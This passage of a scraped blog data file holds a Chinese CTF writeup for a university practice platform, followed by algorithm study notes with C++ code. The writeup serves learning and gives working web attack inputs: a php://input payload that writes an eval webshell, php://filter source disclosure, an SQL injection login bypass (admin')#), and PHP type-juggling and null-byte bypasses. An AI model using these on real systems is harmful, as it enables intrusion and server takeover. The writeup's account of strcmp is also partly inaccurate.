'lower'); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母foreach ($ps as $pt)&#123;if (preg_match(\"/[[:$pt:]]+/\", $password))$c += 1;&#125;if ($c &lt; 3) break;//&gt;=3，必须包含四种类型三种与三种以上if (\"42\" == $password) echo $flag;else echo 'Wrong password';exit;&#125;&#125;?&gt; post了一个空数组上去就弹出flag了…具体原因有待学习 有两个题目挂掉了…….做不了暂时就写这么多吧…","categories":[{"name":"Writeup","slug":"Writeup","permalink":"https://gardenia30.top/categories/Writeup/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://gardenia30.top/tags/CTF/"},{"name":"Writeup","slug":"Writeup","permalink":"https://gardenia30.top/tags/Writeup/"}]},{"title":"南京邮电大学CTF平台Writeup","slug":"南京邮电大学CTF平台Writeup","date":"2018-11-09T07:14:45.000Z","updated":"2018-12-22T11:33:46.518Z","comments":true,"path":"2018/11/09/南京邮电大学CTF平台Writeup/","link":"","permalink":"https://gardenia30.top/2018/11/09/南京邮电大学CTF平台Writeup/","excerpt":"前言给自己一个备忘录，记录学习过程","text":"前言给自己一个备忘录，记录学习过程 正文Web题解文件包含1.直接包含内有运行代码的文件123&lt;?php include $_GET['file'];?&gt; 那么就可以通过抓包修改file值的办法去运行一些本来不该运行的文件也可以通过此方法直接输出一些敏感的配置文件和远程包含shell（需要目标主机开启allow_url_fopen)2.通过PHP内置协议直接读取代码通过构造以下语句1http://xxx.com/index.php?file=php://filter/read=convert.base64-encode/resource=xxx.php 就能获得xxx.php的代码的base64加密结果，通过base64解密后便可获得xxx.php的代码3.写入php文件使用如下URL1http://xxx.com/index.php?file=php://input 并在http头里提交1&lt;?fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval($_post[&apos;xxx&apos;];?&gt;&quot;)?&gt; 就能在index.php目录下生成shell.php 此题考查顾名思义为文件包含漏洞，点开click me? no;通过URL里?file=show.php大致可以确定为是GET方式提交构造以下语句：得到一大串的base64编码，进行base64解码得到php代码里就有flag12345678910111213141516&lt;html&gt; &lt;title&gt;asdf&lt;/title&gt; &lt;?php error_reporting(0); if(!$_GET[file])&#123;echo '&lt;a href=\"./index.php?file=show.php\"&gt;click me? no&lt;/a&gt;';&#125; $file=$_GET['file']; if(strstr($file,\"../\")||stristr($file, \"tp\")||stristr($file,\"input\")||stristr($file,\"data\"))&#123; echo \"Oh no!\"; exit(); &#125; include($file); //flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;?&gt;&lt;/html&gt; bypass again这一题是一个PHP弱类型绕过的题目具体的PHP弱类型分析参考的是这一篇文章：http://www.cnblogs.com/Mrsm1th/p/6745532.htmlphp中有两种比较的符号 == 与 ====== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较== 在进行比较的时候，会先将字符串类型转化成相同，再比较题目如下12345678if (isset($_GET['a']) and isset($_GET['b']))&#123; if ($_GET['a'] != $_GET['b']) if (md5($_GET['a']) == md5($_GET['b'])) die('Flag: '.$flag); else print 'Wrong.';&#125; 所以当判断中为”==”的时候会将两边先转换为一样的数据类型;0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0，md5(‘240610708’) == md5(‘QNKCDZO’)成功绕过!因为是GET方式提交的数据，所以可以直接修改url的值来提交a和b的值，提交两个结果MD5加密以后前两位都是0e的值，这样php就会认为这两个值经过MD5加密以后的值都为0，所以就可以直接爆出flag /x00题目如下：123456789if (isset ($_GET['nctf'])) &#123; if (@ereg (\"^[1-9]+$\", $_GET['nctf']) === FALSE) echo '必须输入数字才行'; else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE) die('Flag: '.$flag); else echo '骚年，继续努力吧啊~';&#125; 这题考察的是ereg()的00截断，满足nctf必须是1-9的实数；strpos函数判断的是后面的字符中在前面的字符中出现的位置，返回其位置，从0开始；所以试一下1%00#biubiubiu,先截断输入的数字，使ereg()函数不能识别到%00后面字符，所以就顺利绕过ereg()函数的判断，其次要使得strpos函数识别到nctf中包含了#biubiubiu这一串字符，但是在url中不能识别#，所以就使用url编码%23来替换#，所以构造如下的url1http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=1%00%23biubiubiu 就可以直接弹出flag SQL1SQL注入题，源码如下12345678910111213141516171819202122232425262728293031&lt;html&gt;&lt;head&gt;Secure Web Login&lt;/head&gt;&lt;body&gt;&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = trim($_POST[user]); $pass = md5(trim($_POST[pass])); $sql=\"select user from ctf where (user='\".$user.\"') and (pw='\".$pass.\"')\"; admin echo '&lt;/br&gt;'.$sql; $query = mysql_fetch_array(mysql_query($sql)); if($query[user]==\"admin\") &#123; echo \"&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;\"; &#125; if($query[user] != \"admin\") &#123; echo(\"&lt;p&gt;You are not admin!&lt;/p&gt;\"); &#125;&#125;echo $query[user];?&gt;&lt;form method=post action=index.php&gt;&lt;input type=text name=user value=\"Username\"&gt;&lt;input type=password name=pass value=\"Password\"&gt;&lt;input type=submit&gt;&lt;/form&gt;&lt;/body&gt;&lt;a href=\"index.phps\"&gt;Source&lt;/a&gt;&lt;/html&gt; 和老师上课讲的例子很吻合，就是一个很基础的用引号强行将原来的引号闭合，然后添加上括号，用#对后面的内容进行注释就可以了题目要求用admin登录才可以获取flag，所以注入的内容如下：1admin&apos;)# 闭合掉单引号然后闭合括号，注释掉后面对pass的判断，直接弹出flag MYSQL这题是在页面给了提示robots.txt查看此文件的内容得到如下的内容12345678910111213141516#TIP:sql.php&lt;?phpif($_GET[id]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id = intval($_GET[id]); $query = @mysql_fetch_array(mysql_query(\"select content from ctf2 where id='$id'\")); if ($_GET[id]==1024) &#123; echo \"&lt;p&gt;no! try again&lt;/p&gt;\"; &#125; else&#123; echo($query[content]); &#125;&#125;?&gt; tip为sql.php,然后还要用GET传一个id上去，这个id经过intval()函数以后赋值$id,要求传的id不等于1024但是要得到id=1024的值，所以试一下1024.1成功得到flag但是自己依旧是一脸懵逼…不知道咋的就蹦出来flag；事后查了一下intval函数12345678910&lt;?phpecho(intval(1024.1));echo '&lt;/br&gt;';echo(intval(1024.4));echo '&lt;/br&gt;';echo(intval(1024.5));echo '&lt;/br&gt;';echo(intval(1024.9));echo '&lt;/br&gt;';?&gt; 这是测试的结果测试了一下这个函数的用处:intval最常用的是在程序中功滤入进数据库的变量，将其转换为整型所以只要传一个整型值为1024而且自生不是1024的数值进去就可以了……soga…… passcheck题目给出了源码,代码审计题12345678910111213$pass=@$_POST['pass'];$pass1=***********;//被隐藏起来的密码if(isset($pass))&#123;if(@!strcmp($pass,$pass1))&#123;echo \"flag:nctf&#123;*&#125;\";&#125;else&#123;echo \"the pass is wrong!\";&#125;&#125;else&#123;echo \"please input pass!\";&#125;?&gt; 也就是strcmp($pass,$pass1)值为0的时候输出flag，所以应该又是绕过之类的题目，小白不知道这个函数的作用个，所以上网科普了一下，PHP中strcmp函数的作用如下12345678910111213&lt;?phpecho strcmp(\"Hello world!\",\"Hello world!\"); // 两字符串相等echo '&lt;/br&gt;';echo strcmp(\"Hello world!\",\"Hello\"); // string1 大于 string2echo '&lt;/br&gt;';echo strcmp(\"Hello world!\",\"Hello world! Hello!\"); // string1 小于 string2echo '&lt;/br&gt;';?&gt;结果：07-7 以上代码用于测试此函数的作用结果显而易见，len(string1)==len(string2)返回0，否则返回string1比string2长多少或者短多少。此题要求strcmp($pass,$pass1)的值为0，你不可能知道pass1的长度，所以要想办法绕过这个条件满足条件，上网搜索了一下，发现只要post一个数组过去就可以了，写一个py脚本传参到指定的url12345import requestsurl=\"http://chinalover.sinaapp.com/web21/\"s=requests.Session()post=&#123;\"pass[]\":1&#125;print(s.post(url,data=post).text) 得到flag如下： 变量覆盖今天又学到了一点新知识，关于php里的变量覆盖问题题目如下：在底部给出了sourcecode，查看一波源码发现存在extract()函数，应该就是这个函数的问题，extract函数的用处如下123extract() 函数从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。该函数返回成功设置的变量数目。 会将对应的键值当做变量，并且将键对应的值赋值给这个变量，所以就存在原先已经赋过值的变量被重新赋值的现象。这题的要求就是:1$pass==$thepassword_123 题目要求是post，就直接传两个相等的值即可结果如下： 起名字真难源码如下123456789101112131415161718192021&lt;?phpfunction noother_says_correct($number)&#123; $one = ord('1'); $nine = ord('9'); for ($i = 0; $i &lt; strlen($number); $i++) &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; return false; &#125; &#125; return $number == '54975581388';&#125;$flag='*******';if(noother_says_correct($_GET['key'])) echo $flag;else echo 'access denied';?&gt; 大概就是扫描number这个字符串，发现数字就输出”access denied”,如果没有数字就输出1return $number == &apos;54975581388&apos;; 根据以前的做题经验，大概又是php弱类型的绕过，绞尽脑汁都没有想出来应该怎么绕过这个数字，再贴一篇干货帖子：https://www.freebuf.com/articles/web/166543.html了解到可能是传一个十六进制数上去，解析以后和原来的数相等就可以了，但我心想怎么可能这么巧就是这个十六进制数不包含0-9的数呢，不管了，先试一试，十六进制转换以后果然不包含0-9的数字…wtf?(心中万头cn马奔腾)…进制转换是ccccccccc，加上十六进制符号0xccccccccc即可 密码重置查看网页源代码：显示数据的提交方式都是POST方式,提交的数据有user/newpass/vcode这三项，都是要POST传参的，传递的数据如下所示：传参构造的url需要注意，将ctfuser的base64编码值换成admin的编码值结果如下： MISC题解丘比龙De女神这题拿到手是一个文件gif,改成gif后缀发现是一张gif图片，放到kali里跑一下发现确实有点猫腻，如下图：发现了一个zip文件，于是返回将文件格式改为zip，得到一个压缩包，解压无果，果然没这么简单，丢进十六进制编辑器得到一个gif格式的文件头，搜索003B(gif文件尾)如下发现后面还是有文件，另存，但是感觉这个love有点奇怪，算了，先记录一下，管他有没有用。。。文件的14 00 01 00 08 00特别熟悉，就是zip文件的文件头的一部分，说做就做，把前面改成压缩包的文件头解压发现需要密码，填入先前记录的love解压成功，得到一张女神图片(有点…瓜)需要的是图片的MD5值，去kali用md5sum跑一下得到flag值 Remove Boyfriend流量包分析题，丢进wireshark，协议分级统计发现全部为TCP数据包追踪TCP流，在2号流里发现有用信息在3号流里发现flag.py源码研究发现是一个凯撒加密移位算法运行发现flag is not here，证明字符串s错误，需要找到正确的s1234567891011121314151617181920212223242526272829def Upper(ch): if ch&gt;='A' and ch&lt;='Z': return True def Lower(ch): if ch&gt;='a' and ch&lt;='z': return True def X1con(s): flag = '' for i in s: if Upper(i) == True: if i&gt;='A' and i&lt;='M': flag += chr(ord(i)+13) else: flag += chr(ord(i)-13) elif Lower(i) == True: if i&gt;='a' and i&lt;='m': flag += chr(ord(i)+13) else: flag += chr(ord(i)-13) else: flag += i return flag if __name__ == \"__main__\": s = '&#123;synt_vf_abg_urer&#125;' print X1con(s) 在6号流里发现有用信息，发现文件头为png，是图片没得跑转为原始数据保存为png文件果然得到一张小姐姐的照片,在左下角发现字符串信息，提交试一下不行将之前的py文件里的变量s改为这个字符串运行得到flag MD5这题给出一段MD5加密的部分明文和密文123密文：e9032???da???08????911513?0???a2 明文：TASC?O3RJMV?WDJKX?ZM要求你还原出密文并且加上nctf&#123;&#125;提交 网络安全课程上老师讲了口令破解的时候讲了暴力破解，新学了个比较有用的脚本可以专门用来爆破MD5口令123456789101112import hashlibstr1='TASC'str2='O3RJMV'str3='WDJKX'str4='ZM'for a in range(32,126): for b in range(32,126): for c in range(32,126): m=str1+chr(a)+str2+chr(b)+str3+chr(c)+str4 x=hashlib.md5(m).hexdigest() if(x[0:5]=='e9032'): print x 在ASCII码32~126之间对这三个缺失的明文字符进行穷举，由于MD5加密的不可逆性质，所以采用对比密文的方式检验，如果前五位和原来一样就相当于找到了正确的明文，暴力破解得到密文串，加上nctf提交即可 图种这题是一个简单的隐写题，给了一个gif格式的图片，话不多说直接丢进十六进制编辑器，搜索关键字504B0304得到一个PK文件头将文件改为zip格式后解压即可再次得到一个gif图片，flag是图片最后一句话的首字母加上nctf提交即可","categories":[{"name":"Writeup","slug":"Writeup","permalink":"https://gardenia30.top/categories/Writeup/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://gardenia30.top/tags/CTF/"},{"name":"Writeup","slug":"Writeup","permalink":"https://gardenia30.top/tags/Writeup/"}]},{"title":"递归与分治","slug":"递归与分治","date":"2018-11-08T14:01:42.000Z","updated":"2018-12-22T11:32:15.776Z","comments":true,"path":"2018/11/08/递归与分治/","link":"","permalink":"https://gardenia30.top/2018/11/08/递归与分治/","excerpt":"前言递归到天荒地老","text":"前言递归到天荒地老 正文递归过程摸索123456789101112131415161718192021222324#include&lt;iostream&gt;using namespace std;int fun(int n)&#123; if (n &gt; 5) &#123; return n; &#125; else &#123; cout &lt;&lt; \"leval 1th-n\" &lt;&lt;\" \"&lt;&lt;n &lt;&lt; endl; int result = fun(n + 1); cout&lt;&lt; \"leval 2th-n\" &lt;&lt; \" \" &lt;&lt; n &lt;&lt; endl; cout &lt;&lt; \"leval 2th-result\" &lt;&lt; \" \" &lt;&lt; result &lt;&lt; endl; return n; &#125;&#125;int main()&#123; int key = fun(0); cout &lt;&lt; \"main key\" &lt;&lt; \" \" &lt;&lt; key &lt;&lt; endl; system(\"pause\"); return 0;&#125; 青蛙跳台阶题目描述123456789101112131415161718 一只青蛙一次可以跳上1级台阶，也可以跳上2级。求该青蛙跳上一个n级的台阶总共有多少种跳法。输入多组测试样例。每组测试样例包含一个整数n。(1&lt;=n&lt;=100)输出每组测试样例输出一行，表示青蛙跳上n级台阶的跳法数量.所得到的结果模1000000007样例输入34样例输出35 解题思路斐波那契数列，此题递归时间太长，不推荐，最好的方法是迭代code12345678910111213141516171819202122232425262728293031323334353637#include&lt;iostream&gt;using namespace std;unsigned long long fab(unsigned int num)&#123; unsigned long long a = 1000000007; unsigned long long form1 = 1; unsigned long long form2 = 2; unsigned long long target = 0; if (num == 1) &#123; return 1; &#125; else if (num == 2) &#123; return 2; &#125; else &#123; for (int i = 3; i &lt;= num; i++) &#123; target=((form1%a)+(form2%a))%a; form1=form2; form2=target; &#125; return target; &#125;&#125;int main()&#123; unsigned int n; while(cin &gt;&gt; n) &#123; cout &lt;&lt;fab(n)&lt;&lt; endl; &#125; return 0;&#125; 排列问题题目描述要求输入一个字符串，输出他的全排列code123456789101112131415161718192021222324252627282930313233343536#include&lt;iostream&gt;#include&lt;string.h&gt;using namespace std;char list[2000];void swap(int a,int b) &#123; int temp=a; a=b; b=temp;&#125;void perm(int k,int m)//输出list数组从k到m位的全排列&#123; if(k==m) &#123; for(int i=0;i&lt;=m;i++)cout&lt;&lt;list[i]; cout&lt;&lt;endl; return; &#125;//递归到k=m为止结束递归 else &#123; for(int i=k;i&lt;=m;i++) &#123; swap(list[k],list[i]); perm(k+1,m); swap(list[k],list[i]); &#125; &#125;&#125;int main()&#123; while(cin&gt;&gt;list) &#123; int len=strlen(list); perm(0,len-1); &#125;&#125; 汽水瓶题目描述123456789101112131415161718有这样一道智力题：“某商店规定：三个空汽水瓶可以换一瓶汽水。小张手上有十个空汽水瓶，她最多可以换多少瓶汽水喝？”答案是5瓶，方法如下：先用9个空瓶子换3瓶汽水，喝掉3瓶满的，喝完以后4个空瓶子，用3个再换一瓶，喝掉这瓶满的，这时候剩2个空瓶子。然后你让老板先借给你一瓶汽水，喝掉这瓶满的，喝完以后用3个空瓶子换一瓶满的还给老板。如果小张手上有n个空汽水瓶，最多可以换多少瓶汽水喝？输入输入文件最多包含10组测试数据，每个数据占一行，仅包含一个正整数n(1≤n≤100)，表示小张手上的空汽水瓶数。n=0表示输入结束，你的程序不应当处理这一行。输出对于每组测试数据，输出一行，表示最多可以喝的汽水瓶数。如果一瓶也喝不到，输出 0样例输入310810样例输出1540 code1234567891011121314151617181920212223242526272829#include&lt;iostream&gt;using namespace std;int bottle(int n)&#123; int count=0; while(n&gt;=3) &#123; int form1=n/3; int form2=n%3; n=form1+form2; count+=form1; if(n==2) &#123; count++; break; &#125; &#125; return count;&#125;int main()&#123; int N; while(cin&gt;&gt;N&amp;&amp;N!=0) &#123; int ans=bottle(N); cout&lt;&lt;ans&lt;&lt;endl; &#125; return 0;&#125; 进制转换题目描述12345678910111213 输入一个十进制正整数，然后输出它所对应的八进制数。输入输入一个十进制正整数n(1≤n≤106) 。输出输出n对应的八进制数，输出在一行。样例输入10样例输出12 code123456789101112131415161718192021#include&lt;iostream&gt;using namespace std;int form(int num)&#123; if (num &lt;8) &#123; return num; &#125; else &#123; return num % 8 + 10 * form(num / 8); &#125;&#125;int main()&#123; int a,b; cin &gt;&gt; a; b = form(a); cout &lt;&lt; b &lt;&lt; endl; return 0;&#125; 二分法题目描述1234567891011121314151617181920212223242526272829在金融中，我们有时会用内部收益率IRR来评价项目的投资财务效益，它等于使得投资净现值NPV等于0的贴现率。换句话说，给定项目的期数T、初始现金流CF0和项目各期的现金流CF1, CF2, ...，CFT，IRR是下面方程的解：为了简单起见，本题假定：除了项目启动时有一笔投入（即初始现金流CF0 &lt; 0）之外，其余各期均能赚钱（即对于所有i=1,2,...,T，CFi &gt; 0）。根据定义，IRR可以是负数，但不能大于-1。输入输入文件最多包含25组测试数据，每个数据占两行，第一行包含一个正整数T（1&lt;=T&lt;=10），表示项目的期数。第二行包含T+1个整数：CF0, CF1, CF2, ..., CFT，其中CF0 &lt; 0, 0 &lt; CFi &lt; 10000 (i=1,2,...,T)。T=0表示输入结束，你的程序不应当处理这一行。输出对于每组数据，输出仅一行，即项目的IRR，四舍五入保留小数点后两位。如果IRR不存在，输出&quot;No&quot;，如果有多个不同IRR满足条件，输出&quot;Too many&quot;（均不含引号）样例输入1-1 22-8 6 90样例输出1.000.50 思路从无穷大到-1二分搜索答案 code12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;#include &lt;iomanip&gt;#include &lt;cmath&gt; using namespace std;int main()&#123; int t,i; while(cin&gt;&gt;t&amp;&amp;t!=0) &#123; double a[11]; for(i=0;i&lt;=t;i++) cin&gt;&gt;a[i]; double l,r,mid,x,ans; ans=0.0; l=-1.0; r=1e6; while(fabs(a[0]+ans)&gt;1e-7) &#123; ans=0.0; x=1.0; mid=(l+r)/2; for(int j=1;j&lt;=t;j++) &#123; x=x/(1+mid); ans+=a[j]*x; &#125; if((ans+a[0])&gt;0) l=mid; else r=mid; &#125; cout&lt;&lt;fixed&lt;&lt;setprecision(2)&lt;&lt;mid&lt;&lt;endl; &#125; return 0; &#125;","categories":[{"name":"Study","slug":"Study","permalink":"https://gardenia30.top/categories/Study/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"https://gardenia30.top/tags/Algorithm/"}]},{"title":"贪心算法","slug":"贪心算法","date":"2018-11-03T08:51:32.000Z","updated":"2018-12-22T11:31:01.444Z","comments":true,"path":"2018/11/03/贪心算法/","link":"","permalink":"https://gardenia30.top/2018/11/03/贪心算法/","excerpt":"前言贪心比较简单，但是要掌握好结构体排序的构造","text":"前言贪心比较简单，但是要掌握好结构体排序的构造 正文1.哈夫曼编码题目描述给定一只含有小写字母的字符串；输出其哈夫曼编码的长度。 输入12345第一行一个整数T，代表样例的个数，接下来T行，每行一个字符串，0&lt;T&lt;=2000,字符串长度0&lt;L&lt;=1500.3hrvshlcxeasexdphiopdmntflolfbtbpplahqolqykrqdnwdoq 输出1231051115 思路要构造哈夫曼编码首先就必须要计算出每个字母出现的频率，扫描一遍即可;接下来就需要用这些频率来构造哈夫曼树，在这里需要使用优先队列这个数据结构，将频率全部push进入优先队列按从小到大排列后，使用贪心算法，每次都是将最小的两个频率拿出来构造哈夫曼树，两数的和再次push进队列，重复进行即可。 code12345678910111213141516171819202122232425262728293031323334353637383940#include&lt;iostream&gt;#include&lt;queue&gt;#include&lt;string.h&gt;using namespace std;int main()&#123; int t; cin&gt;&gt;t; while(t--) &#123; char s[2000]; cin&gt;&gt;s; int fre[26]=&#123;0&#125;; int len=strlen(s); for(int i=0;i&lt;len;i++) &#123; fre[s[i]-'a']++; &#125; priority_queue&lt;int,vector&lt;int&gt;,greater&lt;int&gt; &gt;q; for(int i=0;i&lt;26;i++) &#123; if(fre[i]&gt;0) &#123; q.push(fre[i]); &#125; &#125; int sum=0; while(q.size()&gt;=2) &#123; int a=q.top(); q.pop(); int b=q.top(); q.pop(); sum+=(a+b); q.push(a+b); &#125; cout&lt;&lt;sum&lt;&lt;endl; &#125; return 0;&#125; 2.最优装载题目描述轮船载重有限将尽可能多的集装箱装上轮船123456789101112131415161718192021Description有一批集装箱要装上一艘载重量为C的轮船。其中集装箱i的重量为wi。最优装载问题要求确定在装载体积不受限制的情况下，将尽可能多的集装箱装上轮船。Input输入的第一个为测试样例的个数T（ T &lt;= 100 ），接下来有T个测试样例。每个测试样例的第一行是一个整数n（ n &lt;= 1000 ）和一个非负数C（ C &lt;= 10000 ），分别表示集装箱的个数以及轮船的载重量。接下来有n行，每行一个非负数，表示每个集装箱的重量。Output输出最多装集装箱的个数和最终的承重量。Sample Input15 10020501209930 思路贪心选择策略：重量最轻者优先装载将装船过程划为多步选择，每步装一个货箱，每次从剩下的货箱中选择重量最轻的货箱。如此下去直到所有货箱均装上船或船上不能再容纳其他任何一个货箱。 code123456789101112131415161718192021222324252627282930313233343536373839404142#include&lt;iostream&gt;#include&lt;algorithm&gt;using namespace std;int w[100];int c;int n;int load(int k,int z)&#123; int count=0; sort(w,w+k); for(int i=0;i&lt;k;i++) &#123; if(z&gt;=w[i]) &#123; count+=w[i]; z-=w[i]; &#125; else &#123; break; &#125; &#125; return count;&#125;int main()&#123; int t; cin&gt;&gt;t; while(t--) &#123; cin&gt;&gt;n&gt;&gt;c; for(int i=0;i&lt;n;i++) &#123; cin&gt;&gt;w[i]; &#125; int ans=load(n,c); cout&lt;&lt;ans&lt;&lt;endl; &#125; return 0; &#125; 3.配对元素题目描述给出2个序列A={a[1]，a[2]，…，a[n]}，B={b[1]，b[2]，…，b[n]},从A、B中各选出n个元素进行一一配对（可以不按照原来在序列中的顺序） ，并使得所有配对元素差的绝对值之和最大。 输入1234输入的第1行为1个整数n 第2行包含n个整数，题目中的A序列。 第3行包含n个整数，题目中的B序列。42 5 6 31 4 6 7 输出123 一个数，最大配对3与6配对，2与7配对，5与4配对，6与1配对，绝对值之差和为14 对于10%的数据，有n≤20； 对于30%的数据，有n≤100； 对于50%的数据，有n≤1000； 对于100%的数据，有n≤10000；a[i]，b[i]≤100014 思路要使相减的绝对值之和最大，也就是要尽量使得两个数的差要大一点，贪心策略自然就是用a序列最大值减去b序列最小值。 code1234567891011121314151617181920212223242526272829#include&lt;iostream&gt;#include&lt;cmath&gt;#include&lt;algorithm&gt;using namespace std;int main()&#123; int n; cin&gt;&gt;n; int a[100]; int b[100]; for(int i=0;i&lt;n;i++) &#123; cin&gt;&gt;a[i]; &#125; for(int i=0;i&lt;n;i++) &#123; cin&gt;&gt;b[i]; &#125; sort(a,a+n); sort(b,b+n); int j=0,sum=0; for(int i=n-1;i&gt;=0;i--) &#123; sum+=fabs(a[i]-b[j]); j++; &#125; cout&lt;&lt;sum&lt;&lt;endl; return 0; &#125; 4.活动安排题目描述给出n个活动的开始和结束时间，要求找出所有活动集合中不冲突的最大活动数 思路结构体，按结束时间从小到大排序这就是贪心策略：越早结束约优先考虑，第一个默认加入，其后进行判断到底是否可以加入集合，如可以就计数 code1234567891011121314151617181920212223242526272829303132333435363738394041#include&lt;iostream&gt;#include&lt;algorithm&gt;using namespace std;typedef struct node&#123; int begin; int end;&#125;node;bool cmp(node a,node b)&#123; return a.end&lt;b.end;&#125;int main()&#123; int n; while(cin&gt;&gt;n) &#123; node work[100000]; for(int i=0;i&lt;n;i++) &#123; cin&gt;&gt;work[i].begin&gt;&gt;work[i].end; &#125; sort(work,work+n,cmp); int count=1; int temp=work[0].end; for(int i=1;i&lt;n;i++) &#123; if(work[i].begin&gt;=temp) &#123; count++; temp=work[i].end; &#125; else &#123; continue; &#125; &#125; cout&lt;&lt;count&lt;&lt;endl; &#125; return 0;&#125; 5.区间包含题目描述12345678910111213141516171819202122232425已知 n 个左闭右开区间 [a,b)，对其进行 m 次询问，求区间[l,r]最多可以包含 n 个区间中的多少个区间，并且被包含的所有区间都不相交。输入输入包含多组测试数据，对于每组测试数据：第一行包含两个整数 n ,m (1≤n≤100000,1≤m≤100) 接下来 n 行每行包含两个整数 a ,b (0≤a&lt;b≤10^9) 接下来 m 行每行包含两个整数 l ,r (0≤l&lt;r≤10^9) 输出对于每组测试数据，输出 m 行，每行包含一个整数样例输入4 31 32 41 41 21 21 31 4样例输出112 思路和活动安排问题大致相同 code12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include&lt;iostream&gt;#include&lt;algorithm&gt;using namespace std;typedef struct node&#123; int left; int right;&#125;node; bool cmp(node a,node b)&#123; return a.right&lt;b.right;&#125;int main()&#123; int n,m; while(cin&gt;&gt;n&gt;&gt;m) &#123; node nnum[100005],mnum[105]; for(int i=0;i&lt;n;i++) &#123; cin&gt;&gt;nnum[i].left&gt;&gt;nnum[i].right; &#125; for(int i=0;i&lt;m;i++) &#123; cin&gt;&gt;mnum[i].left&gt;&gt;mnum[i].right; &#125; sort(nnum,nnum+n,cmp); for(int i=0;i&lt;m;i++) &#123; int count=0; int t=mnum[i].left; for(int j=0;j&lt;n;j++) &#123; if(nnum[j].left&gt;=t) &#123; if(nnum[j].right&lt;=mnum[i].right) &#123; count++; t=nnum[j].right; &#125; else &#123; break; &#125; &#125; &#125; cout&lt;&lt;count&lt;&lt;endl; &#125; &#125; return 0;&#125; 6.homework题目描述123456789101112131415161718192021222324252627 临近开学了，大家都忙着收拾行李准 备返校，但 I_Love_C 却不为此担心! 因为他的心思全在暑假作业上：目前为止还未开动。暑假作业是很多张试卷，我们这些从试卷里爬出来的人都知道，卷子上的题目有选择题、填空题、简答题、证明题等。而做选择题的好处就在于工作量很少，但又因为选择题题目都普遍很长。如果有 5 张试卷，其中 4 张是选择题，最后一张是填空题，很明显做最后一张所花的时间要比前 4 张长很多。但如果你只做了选择题，虽然工作量很少，但表面上看起来也已经做了4/5的作业了。I_Love_C决定就用这样的方法来蒙混过关，他统计出了做完每一张试卷所需的时间以及它做完后能得到的价值（按上面的原理，选择题越多价值当然就越高咯）。现在就请你帮他安排一下，用他仅剩的一点时间来做最有价值的作业。输入测试数据包括多组。每组测试数据以两个整数 M,N(1&lt;M&lt;20,1&lt;N&lt;10000) 开头，分别表示试卷的数目和 I_Love_C 剩下的时间。接下来有 M 行，每行包括两个整数 T,V(1&lt;T&lt;N,1&lt;V&lt;10000)分别表示做完这张试卷所需的时间以及做完后能得到的价值，输入以 0 0 结束。输出对应每组测试数据输出 I_Love_C 能获得的最大价值。保留小数点 2 位提示：float 的精度可能不够，你应该使用 double 类型。样例输入4 204 105 2210 31 20 0样例输出37.00 思路该题为贪心法解决背包问题，物体可以被拆分，先按照平均价值排序即可 code12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include&lt;iostream&gt;#include&lt;algorithm&gt;#include&lt;iomanip&gt;using namespace std;typedef struct node&#123; double time; double value; double avg;&#125;node;bool cmp(node a,node b)&#123; return a.avg&gt;b.avg;&#125;int main()&#123; int m,n; while(cin&gt;&gt;m&gt;&gt;n&amp;&amp;(m!=0&amp;&amp;n!=0)) &#123; node paper[100]; for(int i=0;i&lt;m;i++) &#123; cin&gt;&gt;paper[i].time&gt;&gt;paper[i].value; paper[i].avg=paper[i].value/paper[i].time; &#125; sort(paper,paper+m,cmp); double temp=(double)n; double sum=0; for(int i=0;i&lt;m;i++) &#123; if(temp&gt;=paper[i].time) &#123; sum+=paper[i].value; temp-=paper[i].time; &#125; else &#123; sum+=paper[i].avg*temp; break; &#125; &#125; cout&lt;&lt;fixed&lt;&lt;setprecision(2)&lt;&lt;sum&lt;&lt;endl; &#125; return 0;&#125;","categories":[{"name":"Study","slug":"Study","permalink":"https://gardenia30.top/categories/Study/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"https://gardenia30.top/tags/Algorithm/"}]},{"title":"算法-动态规划","slug":"动态规划","date":"2018-10-31T12:24:22.000Z","updated":"2018-12-22T11:31:45.045Z","comments":true,"path":"2018/10/31/动态规划/","link":"","permalink":"https://gardenia30.top/2018/10/31/动态规划/","excerpt":"前言最头疼的就是这一块","text":"前言最头疼的就是这一块老师上课又飞快，虽然讲的非常好，但是还是有点跟不上节奏，加之老师根本不分析代码，所以自己考前准备自己动手复习一波。 正文动态规划解决问题的基本方法码一波(1)找出最优解的性质并刻画其结构特征(2)递归地定义最优值(3)以自底向上的方式计算出最优值(4)根据计算最优值时的信息构造最优解 1.矩阵连乘问题矩阵连乘的最优值是n个矩阵连乘的最小数乘次数，最优解是得出矩阵之间该如何进行优先级运算才能得出最优值（也就是加括号的方式） 题目描述给定n个矩阵｛A1,A2,…,An｝，其中Ai与Ai+1是可乘的，i=1,2 ,…,n-1。如何确定计算矩阵连乘积的计算次序，使得依此次序计算矩阵连乘积需要的数乘次数最少。A1={30x35} ; A2={35x15} ;A3={15x5} ;A4={5x10} ;A5={10x20} ;A6={20x25} ;最后的结果为：((A1(A2A3))((A4A5)A6)) 最小的乘次为15125 